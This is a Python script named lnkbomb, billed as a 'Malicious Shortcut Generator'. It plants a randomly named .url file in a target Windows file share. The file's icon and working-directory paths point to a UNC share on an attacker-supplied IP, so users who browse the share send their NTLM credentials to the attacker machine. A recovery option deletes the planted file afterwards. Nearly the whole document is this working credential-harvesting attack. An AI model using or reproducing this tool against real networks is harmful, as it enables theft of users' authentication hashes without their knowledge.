import os
import sys
import argparse
import textwrap
import string
import random


def banner():
    print('\n')
    print("██      ███    ██ ██   ██ ██████   ██████  ███    ███ ██████")
    print("██      ████   ██ ██  ██  ██   ██ ██    ██ ████  ████ ██   ██")
    print("██      ██ ██  ██ █████   ██████  ██    ██ ██ ████ ██ ██████")
    print("██      ██  ██ ██ ██  ██  ██   ██ ██    ██ ██  ██  ██ ██   ██")
    print("███████ ██   ████ ██   ██ ██████   ██████  ██      ██ ██████\n")
    print("                 Malicious Shortcut Generator               ")
    print("                    A project by The Mayor                  \n")


def options():
    opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
        '''Example: python3 lnkbomb.py --target \\\\192.168.1.1\\share --attacker 192.168.1.2
        Example: python3 lnkbomb.py --recover filename
'''))
    opt_parser.add_argument(
        '-t', '--target', help='Sets the target file share.')
    opt_parser.add_argument(
        '-a', '--attacker', help='Sets the attack machine IP.')
    opt_parser.add_argument(
        '-r', '--recover', help='Removes the malicious payload from the share.')
    global args
    args = opt_parser.parse_args()
    if len(sys.argv) == 1:
        opt_parser.print_help()
        opt_parser.exit()


def main():
    try:
        if args.target is not None:
            file_name = ''.join(random.choice(string.ascii_lowercase)
                                for i in range(10))
            directory = ''.join(random.choice(string.ascii_lowercase)
                                for i in range(10))
            with open(f'{args.target}\{file_name}.url', 'w', newline='\r\n') as payload_file:
                payload_file.write(
                    f"[InternetShortcut]\nURL={args.attacker}\nWorkingDirectory=\\\\{args.attacker}\{directory}\nIconFile=\\\\{args.attacker}\{directory}.icon\nIconIndex=1")
                print(
                    f'Malicious shortcut named {file_name}.url created in the {args.target} file share.\r\n')
            with open(f'{file_name}.recovery', 'a+') as recovery_file:
                recovery_file.write(f'{args.target}\{file_name}')
                print(
                    f'Recovery file {file_name}.recovery created in your current directory.\n')
                print(
                    f'Run python3 lnkbomb.py -r {file_name}.recovery to remove the file from the target share.')
    except FileNotFoundError:
        print("File share cannot be found. Try again.")
        quit()


def recovery():
    try:
        if args.recover is not None:
            with open(args.recover) as recover_files:
                for line in recover_files:
                    os.remove(f'{line}.url')
                    print('Malicious shortcut file removed.')
    except FileNotFoundError:
        ("Recovery file not found. Try again.")
        quit()


if __name__ == "__main__":
    banner()
    options()
    main()
    recovery()
